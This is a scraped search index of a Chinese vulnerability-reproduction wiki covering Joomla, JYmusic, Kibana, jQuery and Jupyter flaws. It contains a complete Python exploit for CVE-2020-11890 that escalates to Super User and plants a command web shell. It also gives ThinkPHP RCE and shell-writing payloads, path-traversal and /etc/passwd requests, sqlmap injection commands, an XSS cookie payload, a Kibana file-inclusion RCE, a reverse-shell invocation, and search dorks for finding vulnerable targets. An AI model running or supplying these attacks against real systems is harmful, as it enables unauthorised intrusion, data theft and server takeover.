远程命令执行漏洞/（CVE-2020-11890）Joomla 远程命令执行漏洞.html":{"url":"Web安全/Joomla/（CVE-2020-11890）Joomla 远程命令执行漏洞/（CVE-2020-11890）Joomla 远程命令执行漏洞.html","title":"（CVE-2020-11890）Joomla 远程命令执行漏洞","keywords":"","body":"Joomla 远程命令执行漏洞 一、漏洞简介 受影响的版本：3.9.17之前的Joomla核心用户要求：管理员帐户（非超级管理员）获得访问权限：创建一个新的超级管理员，然后触发RCE。 二、漏洞影响 Joomla \\ 三、复现过程 漏洞分析 本次漏洞可以将joomla系统中的Administrator用户提权为Super Users。在分析漏洞前，我们来看一下Super Users与Administrator有什么区别： 超级管理员 (Super Users)：拥有Joomla的所有权限。并且超级管理员只能由另一个超级管理员来创建。 高级管理员（Administrator）：Administrator没有权限将一个用户升级成超级用户或者编辑一个超级用户、不可以修改Joomla的全局设置，没有权限来改变和安装模板和Joomla的语言文件。 作为测试，我们新建三个账号，分别为administrator（administrator用户组）、Super User（Super User用户组）、test（administrator用户组） Joomla远程命令执行漏洞/media/rId25.png) 使用Administrator账号登陆，访问Joomla全局设置链接 /administrator/index.php?option=com_config Joomla远程命令执行漏洞/media/rId26.png) 可见Administrator用户组权限不可以访问该功能页面。 使用Administration账号编辑test账号的用户组 Joomla远程命令执行漏洞/media/rId27.png) Administrator用户组权限不可以为其他的用户添加super user权限 使用Superuser账号登陆，访问Joomla全局设置链接 Joomla远程命令执行漏洞/media/rId28.png) Superuser权限可以访问Joomla全局设置页面 使用Superuser账号编辑test账号的用户组 Joomla远程命令执行漏洞/media/rId29.png) 可以为test账号添加super user权限 关于漏洞的初步猜测 在刚看到漏洞简介时，我猜测会不会是joomla只在前端做了校验，使用Administration账号编辑test账号的用户组时，在前端把super user这个选项卡隐藏起来了，后端并未校验权限，使得漏洞产生。 为了验证我的猜想，我在修改test用户组时抓包并修改其中的jform[groups]值 Joomla远程命令执行漏洞/media/rId31.png) 每一个用户组都有一个id值，这个可以通过数据库中查看得来 Joomla远程命令执行漏洞/media/rId32.png) 因为我需要将test账号改为super users用户组权限，因此需改数据包中jform[groups]值为8 经过测试发现，这是行不通的 Joomla远程命令执行漏洞/media/rId33.png) 在猜想失败之后，只好动态调试一下源代码，看一下joomla是如何进行权限校验的 动态调试 既然在上文猜想中，我们强行改包时抛出了个Save failed with the following error: User not SuperAdministrator错误，那么直接在源代码中找到抛出错误的位置libraries\\src\\User\\User.php Joomla远程命令执行漏洞/media/rId35.png) 可见上图中，只要checkGroup方法为真，则进入if分支抛出Save failed with the following error: User not Super Administrator错误 Joomla远程命令执行漏洞/media/rId36.png) 首先来看下getGroupPath Joomla远程命令执行漏洞/media/rId37.png) getGroupPath的作用是通过传入的groupid参数，获取要查询的用户组分支中叶子节点所属用户组，并返回到树的根节点。简而言之，就是获取用户组列表------groups列表中对应用户组的path属性值 用户组列表（groups） 我们来看下groups列表是什么，是怎么生成的用户组列表（groups）中记录了所有用户组的属性值，包括名称、id、双亲节点信息、该节点的祖先数组 接下来分析下groups列表是怎么生成的首先，程序从数据库usergroups表中读取每一个用户组的属性值数据库中数据如下 Joomla远程命令执行漏洞/media/rId39.png)程序读取后赋值到groups数组中 Joomla远程命令执行漏洞/media/rId40.png) 接着调用populateGroupData方法对groups数组中每个用户组数据进行补充 Joomla远程命令执行漏洞/media/rId41.png) 在这一环节，程序将为每一个用户组提供path与level属性值 其中path属性就是树形结构中以该用户组节点的祖先(Ancestor)数组、level即为该结点的层次(Levelof Node) 回顾一下数据库中每个用户组的属性值，这里注意parent_id值 Joomla远程命令执行漏洞/media/rId42.png) 除了Public父节点为0之外，其他的用户组在表中都存在对应的双亲节点。可见Public用户组为树形结构中的根节点，层次为1。 Joomla远程命令执行漏洞/media/rId43.png) Registered、Manager、Super Users、Guest的双亲节点id皆为1，即Public节点 。层次为2剩余的用户组节点分别以Registered、Manager、Super Users、Guest四个节点作为双亲节点。 用户节点的树形图如下 Joomla远程命令执行漏洞/media/rId44.png) 动态调试结果如下 Joomla远程命令执行漏洞/media/rId45.png) 从上图可见，这里以Public用户组节点举例：Public作为根节点，其path以及level生成时比较特殊，进入parentid为0的if分支，最终祖先数组path为array(0 => \\'1\\')， level为0 再以Registered、Manager、Super Users、Guest这四个层次为2的用户组节点中的Guest节点为例 Joomla远程命令执行漏洞/media/rId46.png) Guest节点的path为array (0 => \\'1\\',1 =>\\'9\\',)，level为1。Path是由Guest节点所有祖先组成的集合，level值为该节点层数减一 最后看一下其他层次大于2的节点，以Administrator用户组节点举例 Joomla远程命令执行漏洞/media/rId47.png) 从数据库中可见，Administrator用户组双亲节点id为6，对应 Manager节点，Manager用户组节点的双亲节点id为1，对应Public用户组节点。其层次为3 Joomla远程命令执行漏洞/media/rId48.png) 通过调试也可看出，Administrator用户组节点的祖先数组path为array (0 => \\'1\\', 1 =>\\'6\\', 2 => \\'7\\',)，level为2 在弄明白groups列表之后，看一下程序是如何判断当前用户的权限判断的 回到checkGroup方法中 Joomla远程命令执行漏洞/media/rId49.png) 上文以及指导getGroupPath方法的作用了，由于我们请求构造中的$groupid为8，即想把test账号添加到id为8对应的super users组。getGroupPath接收传入的$groupid,返回super user节点的祖先数组array (0=> \\'1\\', 1 => \\'8\\',) Joomla远程命令执行漏洞/media/rId50.png) 接着，在libraries\\src\\Access\\Rule.php的allow方法中，程序遍历superuser的祖先数组array(0 => \\'1\\', 1 => \\'8\\',) Joomla远程命令执行漏洞/media/rId51.png) 程序判断superuser的祖先节点是否有在$this->data中出现，$this->data值如下 Joomla远程命令执行漏洞/media/rId52.png) $this->data数组代表目前用户不可以访问的节点id。由于我们使用的是administrator用户组的账号，不可以操作的用户组节点id为8，即super user，因此$this->data数组值为array (8 => 1,) superuser的祖先数组中的叶子节点值为8，正好在目前用户不可以访问的$this->data数组中 Joomla远程命令执行漏洞/media/rId53.png) 因此该用户权限无法进行操作，程序抛出当前用户不是超级管理员的错误 Joomla远程命令执行漏洞/media/rId54.png) 漏洞复现 Joomla远程命令执行漏洞/media/rId56.png) #!/usr/bin/python import sys import requests import re import argparse def extract_token(resp): match = re.search(r'name=\"([a-f0-9]{32})\" value=\"1\"', resp.text, re.S) if match is None: print(\"[-] Cannot find CSRF token!\\n\") return None return match.group(1) def try_admin_login(sess, url, uname, upass): admin_url = url + '/administrator/index.php' print('[+] Getting token for admin login') resp = sess.get(admin_url, verify=True) token = extract_token(resp) if not token: return False print('[+] Logging in to admin') data = { 'username': uname, 'passwd': upass, 'task': 'login', token: '1' } resp = sess.post(admin_url, data=data, verify=True) if 'task=profile.edit' not in resp.text: print('[!] Admin Login Failure!') return None print('[+] Admin Login Successfully!') return True def checkAdmin(url, sess): print(\"[+] Checking admin\") url_check = url + '/administrator/index.php?option=com_users&view=users' resp = sess.get(url_check, verify=True) token = extract_token(resp) if not token: print \"[-] You are not administrator!\" sys.exit() return token def checkSuperAdmin(url, sess): print(\"[+] Checking Superadmin\") url_check = url + '/administrator/index.php?option=com_config' resp = sess.get(url_check, verify=True) token = extract_token(resp) if not token: print \"[-] You are not Super-Users!\" sys.exit() return token def changeGroup(url, sess, token): print(\"[+] Changing group\") newdata = { 'jform[title]': 'Public', 'jform[parent_id]': 100, 'task': 'group.apply', token: 1 } newdata['task'] = 'group.apply' resp = sess.post(url + \"/administrator/index.php?option=com_users&layout=edit&id=1\", data=newdata, verify=True) if 'jform[parent_id]' not in resp.text: print('[!] Maybe failed to change group...') return False else: print \"[+] Done!\" return True def create_user(url, sess, username, password, email, token): newdata = { # Form data 'jform[name]': username, 'jform[username]': username, 'jform[password]': password, 'jform[password2]': password, 'jform[email]': email, 'jform[resetCount]': 0, 'jform[sendEmail]': 0, 'jform[block]': 0, 'jform[requireReset]': 0, 'jform[id]': 0, 'jform[groups][]': 8, token: 1, } newdata['task'] = 'user.apply' url_post = url + \"/administrator/index.php?option=com_users&layout=edit&id=0\" sess.post(url_post, data=newdata, verify=True) sess.get(url + \"/administrator/index.php?option=com_login&task=logout&\" + token + \"=1\", verify=True) sess = requests.Session() if try_admin_login(sess, url, username, password): print \"[+] Now, you are super-admin!!!!!!!!!!!!!!!!\" + \"\\n[+] Your super-admin account: \\n[+] USERNAME: \" + username + \"\\n[+] PASSWORD: \" + password + \"\\n[+] Done!\" else: print \"[-] Sorry,exploit fail!\" return sess def changeGroupDefault(url, sess, token): print(\"[+] Changing group\") newdata = { 'jform[title]': 'Public', 'jform[parent_id]': 0, 'task': 'group.apply', token: 1 } newdata['task'] = 'group.apply' resp = sess.post(url + \"/administrator/index.php?option=com_users&layout=edit&id=1\", data=newdata, verify=True) if 'jform[parent_id]' not in resp.text: print('[!] Maybe failed to change group...') return False else: print \"[+] Done!\" return True def rce(sess, url, cmd, token): filename = 'error.php' shlink = url + '/administrator/index.php?option=com_templates&view=template&id=506&file=506&file=L2Vycm9yLnBocA%3D%3D' shdata_up = { 'jform[source]': \"\", 'task': 'template.apply', token: '1', 'jform[extension_id]': '506', 'jform[filename]': '/' + filename } sess.post(shlink, data=shdata_up) path2shell = '/templates/protostar/error.php?cmd=' + cmd # print '[+] Shell is ready to use: ' + str(path2shell) print '[+] Checking:' shreq = sess.get(url + path2shell) shresp = shreq.text print shresp + '[+] Shell link: \\n' + (url + path2shell) print '[+] Module finished.' def main(): # Construct the argument parser ap = argparse.ArgumentParser() # Add the arguments to the parser ap.add_argument(\"-url\", \"--url\", required=True, help=\" URL for your Joomla target\") ap.add_argument(\"-u\", \"--username\", required=True, help=\"username\") ap.add_argument(\"-p\", \"--password\", required=True, help=\"password\") ap.add_argument(\"-usuper\", \"--usernamesuper\", default=\"hk\", help=\"Super's username\") ap.add_argument(\"-psuper\", \"--passwordsuper\", default=\"12345678\", help=\"Super's password\") ap.add_argument(\"-esuper\", \"--emailsuper\", default=\"hk@hk.com\", help=\"Super's Email\") ap.add_argument(\"-cmd\", \"--command\", default=\"whoami\", help=\"command\") args = vars(ap.parse_args()) # target url = format(str(args['url'])) print '[+] Your target: ' + url # username uname = format(str(args['username'])) # password upass = format(str(args['password'])) # command command = format(str(args['command'])) # username of superadmin usuper = format(str(args['usernamesuper'])) # password of superadmin psuper = format(str(args['passwordsuper'])) # email of superadmin esuper = format(str(args['emailsuper'])) # session sess = requests.Session() if not try_admin_login(sess, url, uname, upass): sys.exit() token = checkAdmin(url, sess) if not changeGroup(url, sess, token): print \"[-] Sorry,exploit fail!\" sys.exit() sess = create_user(url, sess, usuper, psuper, esuper, token) token = checkSuperAdmin(url, sess) # Now you are Super-admin if token: # call RCE changeGroupDefault(url, sess, token) # easy to view :)) rce(sess, url, command, token) if __name__ == \"__main__\": sys.exit(main()) 参考链接 \">https://xz.aliyun.com/t/7709\\#toc-1> https://github.com/HoangKien1020/CVE-2020-11890 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:55:06 "},"Web安全/Joomla/（CVE-2020-25751）Joomla! paGO Commerce 2.5.9.0 sql注入漏洞/（CVE-2020-25751）Joomla! paGO Commerce 2.5.9.0 sql注入漏洞.html":{"url":"Web安全/Joomla/（CVE-2020-25751）Joomla! paGO Commerce 2.5.9.0 sql注入漏洞/（CVE-2020-25751）Joomla! paGO Commerce 2.5.9.0 sql注入漏洞.html","title":"（CVE-2020-25751）Joomla! paGO Commerce 2.5.9.0 sql注入漏洞","keywords":"","body":"（CVE-2020-25751）Joomla! paGO Commerce 2.5.9.0 sql注入漏洞 一、漏洞简介 Joomla!是美国Open Source Matters团队的一套使用PHP和MySQL开发的开源、跨平台的内容管理系统(CMS)。 Joomla! paGO Commerce 插件 2.5.9.0版本存在sql注入漏洞。该漏洞源于administrator/index.php?option=com_pago＆view=comments filter_published 参数。攻击者可利用该漏洞执行非法SQL命令。 二、漏洞影响 Joomla! paGO Commerce 2.5.9.0 三、复现过程 POST /joomla/administrator/index.php HTTP/1.1 Host: www.0-sec.org:8000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 154 Origin: http://localhost Connection: close Referer: http://www.0-sec.org/joomla/administrator/index.php?option=com_pago&view=comments Cookie: 4bde113dfc9bf88a13de3b5b9eabe495=sp6rp5mqnihh2i323r57cvesoe; crisp-client%2Fsession%2F0ac26dbb-4c2f-490e-88b2-7292834ac0e9=session_a9697dd7-152d-4b1f-a324-3add3619b1e1 Upgrade-Insecure-Requests: 1 filter_search=&limit=10&filter_published=1&task=&controller=comments&boxchecked=0&filter_order=id&filter_order_Dir=desc&5a672ab408523f68032b7bdcd7d4bb5c=1 sqlmap poc: sqlmap -r www.0-sec.org --dbs --risk=3 --level=5 --random-agent -p filter_published 参考链接 https://www.nmmapper.com/st/exploitdetails/48811/43057/joomla-pago-commerce-2590-sql-injection-authenticated/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:55:12 "},"Web安全/Joomla/Joomla 3-3.4.6 远程命令执行漏洞/Joomla 3-3.4.6 远程命令执行漏洞.html":{"url":"Web安全/Joomla/Joomla 3-3.4.6 远程命令执行漏洞/Joomla 3-3.4.6 远程命令执行漏洞.html","title":"Joomla 3-3.4.6 远程命令执行漏洞","keywords":"","body":"Joomla 3.4.6 - \\'configuration.php\\' 远程代码执行 一、漏洞简介 Joomla 3.4.6 - \\'configuration.php\\' Remote Code Execution 二、影响范围 Joomla 3.0.0 至 3.4.6 三、复现过程 https://github.com/ianxtianxt/Joomla-3.4.6---configuration.php-Remote-Code-Execution 脚本验证 验证： python3 test.py -t http://127.0.0.1:8080/ 显示\"Vulnerable\"证明存在漏洞 利用： python3 test.py -t http://127.0.0.1:8080/ --exploit --lhost 192.168.31.126 --lport 2121 执行成功 并在\"configuration.php\"写入随机密码的一句话木马 上图的密码为：kyevgbxjmwivdvegohfzwuukuzswxqquthlrsollpxzgiifumi 蚁剑链接测试 image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:48 "},"Web安全/Joomla/Joomla 3.4.6 - 'configuration.php' Remote Code Execution/Joomla 3.4.6 - 'configuration.php' Remote Code Execution.html":{"url":"Web安全/Joomla/Joomla 3.4.6 - 'configuration.php' Remote Code Execution/Joomla 3.4.6 - 'configuration.php' Remote Code Execution.html","title":"Joomla 3.4.6 - 'configuration.php' Remote Code Execution","keywords":"","body":"Joomla 3.4.6 configuration.php 远程代码执行 一、漏洞简介 Joomla 3.4.6 - \\'configuration.php\\' Remote Code Execution 二、影响范围 Joomla 3.0.0 至 3.4.6 三、复现过程 https://github.com/ianxtianxt/Joomla-3.4.6\\-\\--configuration.php-Remote-Code-Execution 脚本验证 验证： python3 test.py -t http://127.0.0.1:8080/ 显示\"Vulnerable\"证明存在漏洞 利用： python3 test.py -t http://127.0.0.1:8080/ --exploit --lhost 192.168.31.126 --lport 2121 执行成功 并在\"configuration.php\"写入随机密码的一句话木马上图的密码为：kyevgbxjmwivdvegohfzwuukuzswxqquthlrsollpxzgiifumi 蚁剑链接测试 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:50 "},"Web安全/Joomla/Joomla! com_fabrik 3.9.11 目录遍历漏洞/Joomla! com_fabrik 3.9.11 目录遍历漏洞.html":{"url":"Web安全/Joomla/Joomla! com_fabrik 3.9.11 目录遍历漏洞/Joomla! com_fabrik 3.9.11 目录遍历漏洞.html","title":"Joomla! com_fabrik 3.9.11 目录遍历漏洞","keywords":"","body":"Joomla! com_fabrik 3.9.11 目录遍历漏洞 一、漏洞简介 关键字:inurl:\\\"index.php?option=com_fabrik\\\" 二、漏洞影响 Version: 3.9 三、复现过程 poc $> curl -X GET -i \"http://www.0-sec.org/joomla/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../tmp/\" ...snip... [{\"value\":\"eila.jpg\",\"text\":\"eila.jpg\",\"disable\":false},{\"value\":\"eilanya.jpg\",\"text\":\"eilanya.jpg\",\"disable\":false},{\"value\":\"topsecret.png\",\"text\":\"topsecret.png\",\"disable\":false}] ...snip... $> curl -X GET -i \"http://www.0-sec.org/joomla/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../home/user123/Pictures/\" ...snip... [{\"value\":\"Revision2017_Banner.jpg\",\"text\":\"Revision2017_Banner.jpg\",\"disable\":false},{\"value\":\"Screenshot from 2019-02-23 22-43-54.png\",\"text\":\"Screenshot from 2019-02-23 22-43-54.png\",\"disable\":false},{\"value\":\"Screenshot from 2019-03-09 14-59-22.png\",\"text\":\"Screenshot from 2019-03-09 14-59-22.png\",\"disable\":false},{\"value\":\"Screenshot from 2019-03-09 14-59-25.png\",\"text\":\"Screenshot from 2019-03-09 14-59-25.png\",\"disable\":false},{\"value\":\"Screenshot from 2019-03-16 23-17-05.png\",\"text\":\"Screenshot from 2019-03-16 23-17-05.png\",\"disable\":false},{\"value\":\"Screenshot from 2019-03-18 07-30-41.png\",\"text\":\"Screenshot from 2019-03-18 07-30-41.png\",\"disable\":false},{\"value\":\"Screenshot from 2019-03-18 08-23-45.png\",\"text\":\"Screenshot from 2019-03-18 08-23-45.png\",\"disable\":false},{\"value\":\"Screenshot from 2019-04-08 00-09-36.png\",\"text\":\"Screenshot from 2019-04-08 00-09-36.png\",\"disable\":false},{\"value\":\"Screenshot from 2019-04-08 10-34-23.png\",\"text\":\"Screenshot from 2019-04-08 10-34-23.png\",\"disable\":false},{\"value\":\"Screenshot from 2019-04-13 08-23-48.png\",\"text\":\"Screenshot from 2019-04-13 08-23-48.png\",\"disable\":false},{\"value\":\"Screenshot from 2019-05-24 23-14-05.png\",\"text\":\"Screenshot from 2019-05-24 23-14-05.png\",\"disable\":false},{\"value\":\"b.jpg\",\"text\":\"b.jpg\",\"disable\":false},{\"value\":\"by_gh0uli.tumblr.com-8755.png.jpeg\",\"text\":\"by_gh0uli.tumblr.com-8755.png.jpeg\",\"disable\":false},{\"value\":\"max_payne_06.jpg\",\"text\":\"max_payne_06.jpg\",\"disable\":false},{\"value\":\"xxx.jpg\",\"text\":\"xxx.jpg\",\"disable\":false}] ...snip... Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:47 "},"Web安全/Joomla/Joomla! com_hdwplayer 4.2 - 'search.php' sql注入/Joomla! com_hdwplayer 4.2 - 'search.php' sql注入.html":{"url":"Web安全/Joomla/Joomla! com_hdwplayer 4.2 - 'search.php' sql注入/Joomla! com_hdwplayer 4.2 - 'search.php' sql注入.html","title":"Joomla! com_hdwplayer 4.2 - 'search.php' sql注入","keywords":"","body":"Joomla com_hdwplayer 4.2 - \\'search.php\\' sql注入 一、漏洞简介 关键字:inurl:\\\"index.php?option=com_hdwplayer\\\" 二、漏洞影响 com_hdwplayer 4.2 三、复现过程 python ./sqlmap.py -u \"http://127.0.0.1/joomla/index.php\" --method=POST --random-agent --data \"option=com_hdwplayer&view=search&hdwplayersearch=xxx\" --level=5 --risk=3 --dbms=mysql -p hdwplayersearch 参考链接 https://www.exploit-db.com/exploits/48242 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:47 "},"Web安全/Joomla/Joomla! component GMapFP 3.30 任意文件上传/Joomla! component GMapFP 3.30 任意文件上传.html":{"url":"Web安全/Joomla/Joomla! component GMapFP 3.30 任意文件上传/Joomla! component GMapFP 3.30 任意文件上传.html","title":"Joomla! component GMapFP 3.30 任意文件上传","keywords":"","body":"Joomla component GMapFP 3.30 任意文件上传 一、漏洞简介 关键字:inurl:\\'\\'com_gmapfp\\'\\' 二、漏洞影响 Joomla Gmapfp Components 3.x 三、复现过程 http://www.0-sec.org/index.php?option=comgmapfp&controller=editlieux&tmpl=component&task=upload_image file.php.png , file2.php.jpeg , file3.html.jpg ,file3.txt.jpg 目录文件路径 http://www.0-sec.org/images/gmapfp/file.php http://www.0-sec.org/images/gmapfp/file.php.png Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:46 "},"Web安全/Joomla/Joomscan/Joomscan.html":{"url":"Web安全/Joomla/Joomscan/Joomscan.html","title":"Joomscan","keywords":"","body":"joomscan 一、漏洞简介 joomscan 二、影响范围 三、复现过程 https://github.com/rezasp/joomsca Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:51 "},"Web安全/JQuery 1.7.2/JQuery 1.7.2版本任意文件下载漏洞/JQuery 1.7.2版本任意文件下载漏洞.html":{"url":"Web安全/JQuery 1.7.2/JQuery 1.7.2版本任意文件下载漏洞/JQuery 1.7.2版本任意文件下载漏洞.html","title":"JQuery 1.7.2版本任意文件下载漏洞","keywords":"","body":"JQuery 1.7.2版本站点前台任意文件下载漏洞 漏洞描述 使用了JQuery 1.7.2的JavaScript库的站点可通过前台任意文件下载，可读取敏感文件。 漏洞影响 使用了JQuery 1.7.2版本的站点 FOFA body=\"webui/js/jquerylib/jquery-1.7.2.min.js\" 漏洞复现 搜索结果如下： 其中涉及的产品较多，例如： H3C SecPath 下一代防火墙 迈普 ISG1000安全网关 北京圣博润LanSecS第二代防火墙 深圳市万网博通科技有限公司下一代智能防火墙 任子行网络技术股份有限公司任天行网络安全管理系统 中新金盾防火墙 睿峰网云防火墙 安博通深度安全网关 安博通应用网关 金电网安第二代防火墙 蓝盾防火墙 蓝盾信息安全管理审计系统 网御上网行为管理系统 中兴皖通智能多业务网关 卓智智能安全网关 等等。。 就拿圣博润举例吧： 登录界面如下： POC如下 /webui/?g=sys_dia_data_down&file_name=../etc/passwd 再来测试下前台访问 因该漏洞涉及较多，请勿发布至其他公开站点，谢谢配合。 修复建议： 1、对用户输入做控制，最好使用白名单。 2、禁止../与其变形。 3、升级到其他安全版本。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:55:13 "},"Web安全/Jupyter Notebook/Jupyter Notebook 未授权访问远程命令执行漏洞/Jupyter Notebook 未授权访问远程命令执行漏洞.html":{"url":"Web安全/Jupyter Notebook/Jupyter Notebook 未授权访问远程命令执行漏洞/Jupyter Notebook 未授权访问远程命令执行漏洞.html","title":"Jupyter Notebook 未授权访问远程命令执行漏洞","keywords":"","body":"Jupyter Notebook 未授权访问远程命令执行漏洞 漏洞描述 Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。 如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。 漏洞影响 Jupyter Notebook FOFA app=\"Jupyter-Notebook\" && body=\"Terminal\" 漏洞复现 访问目标, 点击 Terminal 打开命令行界面 执行命令并反弹shell Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:55:18 "},"Web安全/JYmusic/JYmusic 1.x 版本 前台getshell/JYmusic 1.x 版本 前台getshell.html":{"url":"Web安全/JYmusic/JYmusic 1.x 版本 前台getshell/JYmusic 1.x 版本 前台getshell.html","title":"JYmusic 1.x 版本 前台getshell","keywords":"","body":"JYmusic 1.x 版本 前台getshell 一、漏洞简介 二、漏洞影响 1.x版本 三、复现过程 访问前台，注册一个用 注册成功后点击右上角设置，个人资料，头像设置 抓包，修改文件后缀为.php 上传成功后访问个人中心，这里头像已经换了，审查元素查看头像的文件路径 访问http://0-sec.org/Uploads/Avatars/uid_2/128.php 成功解析，通过这种办法上传一个phpinfo 访问文件 四、参考链接 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:55:23 "},"Web安全/JYmusic/JYmusic 2.0 前台XSS漏洞/JYmusic 2.0 前台XSS漏洞.html":{"url":"Web安全/JYmusic/JYmusic 2.0 前台XSS漏洞/JYmusic 2.0 前台XSS漏洞.html","title":"JYmusic 2.0 前台XSS漏洞","keywords":"","body":"JYmusic 2.0 前台XSS漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 利用条件 1.登录会员 2.认证音乐人 上传音乐时，抓包，修改name或者cover_url参数 值为： XSS\">alert(document.cookie)> 此时提交的音乐就会存储到数据库中，由于name和cover_url没有过滤，导致在后台管理员审核的 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:55:26 "},"Web安全/JYmusic/JYmusic 2.0 命令执行漏洞/JYmusic 2.0 命令执行漏洞.html":{"url":"Web安全/JYmusic/JYmusic 2.0 命令执行漏洞/JYmusic 2.0 命令执行漏洞.html","title":"JYmusic 2.0 命令执行漏洞","keywords":"","body":"（CNVD-2019-06251）JYmusic 2.0 命令执行漏洞 一、漏洞简介 CNVD-2019-06251 二、漏洞影响 三、复现过程 漏洞分析 危险函数 /core/library/think/Request.php类中的filterValue函数中，使用了call_user_func函数。 通过构造使得$filter=system， $value=dir ，通过call_user_func函数即可执行系统命令\" dir \"。 array_walk_recursive函数 /core/library/think/Request.php类中的input函数里调用了通过array_walk_recursive函数调用了filterValue函数。array_walk_recursive() 函数对数组中的每个元素应用用户自定义函数。 input函数 /core/library/think/Request.php中的param函数调用了input函数。 exec 函数 /core/library/think/App.php类中的exec 函数通过Request::instance()->param()调用了param函数。 run函数 /core/library/think/App.php类中的run函数则调用了exec函数 传入的dispatch和dispatch和dispatch和config两个参数分别来自于/core/library/think/App.php类中run函数里的： 变量覆盖 /core/library/think/App.php类中run函数里，获取dispatch变量值时调用了routeCheck函数。routeCheck函数中则通过Route::chekc调用了check函数。/core/library/think/Route.php类中，check函数通过dispatch变量值时调用了routeCheck函数。routeCheck函数中则通过Route::chekc调用了check函数。/core/library/think/Route.php类中，check函数通过dispatch变量值时调用了routeCheck函数。routeCheck函数中则通过Route::chekc调用了check函数。/core/library/think/Route.php类中，check函数通过request->method()调用了method函数。 /core/library/think/Request.php类中，通过post参数_method=__construct调用构造函数： 在构造函数里用filter=system覆盖类中的filter变量。 post参数 method=GET 就是要再次调用method函数，并且使得if(true===$method)为真，从而获取 _SERVER[REQUEST_METHOD]=dir 这个参数值。 调用入口 /core/library/think/App.php类中的run函数，则是在index.php入口函数中调用。 漏洞复现 拦截首页请求，Change request method修改请求方式为POST 参数： POST的参数的作用已在漏洞分析环节分析。 filter=system&_SERVER[REQUEST_METHOD]=dir&_method=__construct&method=GET POST参数后不能有\\r\\n回车换行，如果有就不能成功执行。 POST /captcha HTTP/1.1 //请求一个验证码，引导程序的运行步骤。 写入shell filter=system&_SERVER[REQUEST_METHOD]=echo “” >test.php&_method=__construct&method=GET phpinfo() http://0-sec.org/test.php?test=phpinfo(); //末尾一定要跟一个“分号” “ ; ” ，如果没有则不能成功执行。 四、参考链接 https://blog.csdn.net/yun2diao/article/details/91345116 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:55:27 "},"Web安全/Kibana/（CVE-2018-17246）Kibana Local File Inclusion/（CVE-2018-17246）Kibana Local File Inclusion.html":{"url":"Web安全/Kibana/（CVE-2018-17246）Kibana Local File Inclusion/（CVE-2018-17246）Kibana Local File Inclusion.html","title":"（CVE-2018-17246）Kibana Local File Inclusion","keywords":"","body":"（CVE-2018-17246）Kibana Local File Inclusion 一、漏洞简介 Kibana 为 Elassticsearch 设计的一款开源的视图工具。其5.6.13到6.4.3之间的版本存在一处文件包含漏洞，通过这个漏洞攻击者可以包含任意服务器上的文件。此时，如果攻击者可以上传一个文件到服务器任意位置，即可执行代码。 二、漏洞影响 Kibana 5.6.13到6.4.3 三、复现过程 直接访问如下URL，来包含文件/etc/passwd： http://www.0-sec.org:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd 虽然在返回的数据包里只能查看到一个500的错误信息，但是我们通过执行docker-compose logs即可发现，/etc/passwd已经成功被包含： KibanaLocalFileInclusion/media/rId24.png) 所以，我们需要从其他途径往服务器上上传代码，再进行包含从而执行任意命令。比如，我们将如下代码上传到服务器的/tmp/vulhub.js： // docker-compose exec kibana bash && echo '...code...' > /tmp/vulhub.js export default {asJson: function() {return require(\"child_process\").execSync(\"id\").toString()}} 成功包含并返回命令执行结果： KibanaLocalFileInclusion/media/rId25.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:55:31 "},"Web安全/Kibana/（CVE-2019-7609）Kibana  6.6.0 未授权远程代码命令执行/（CVE-2019-7609）Kibana  6.6.0 未授权远程代码命令执行.html":{"url":"Web安全/Kibana/（CVE-2019-7609）Kibana  6.6.0 未授权远程代码命令执行/（CVE-2019-7609）Kibana  6.6.0 未授权远程代码命令执行.html","title":"（CVE-2019-7609）Kibana  6.6.0 未授权远程代码命令执行","keywords":"","body":"（CVE-2019-7609）kibana \\ 一、漏洞简介 Kibana 是一款开源的数据分析和可视化平台，它是Elastic Stack成员之一，设计用于和Elasticsearch协作。 二、漏洞影响 kibana \\ 三、复现过程 环境搭建 docker pull docker.elastic.co/kibana/kibana:6.5.4 docker network create elastic docker run --network=elastic --name=elasticsearch docker.elastic.co/elasticsearch/elasticsearch:6.5.4 docker run -d --name kibana --net elastic -p 5601:5601 docker.elastic.co/kibana/kibana:6.5.4 docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' kibana 这样启动的kibana没法调试，可以自己改改镜像，在node启动命令里加个inspect参数： docker ps -a --no-trunc # 找到启动脚本 在node启动命令后加上--inspect=0.0.0.0:9229 docker commit kibana kibana-debug # 保存修改后的镜像 docker rm -f kibana docker run --name kibana --net elastic -p 5601:5601 -p 9229:9229 kibana-debug # 启动修改后的kibana容器 kibana控制台：http://127.0.0.1:5601/ inspect调试器：chrome://inspect/ 漏洞分析 原型链污染点：props()函数可以给对象设置属性 Kibana 有了污染点，就可以思考怎么利用了。 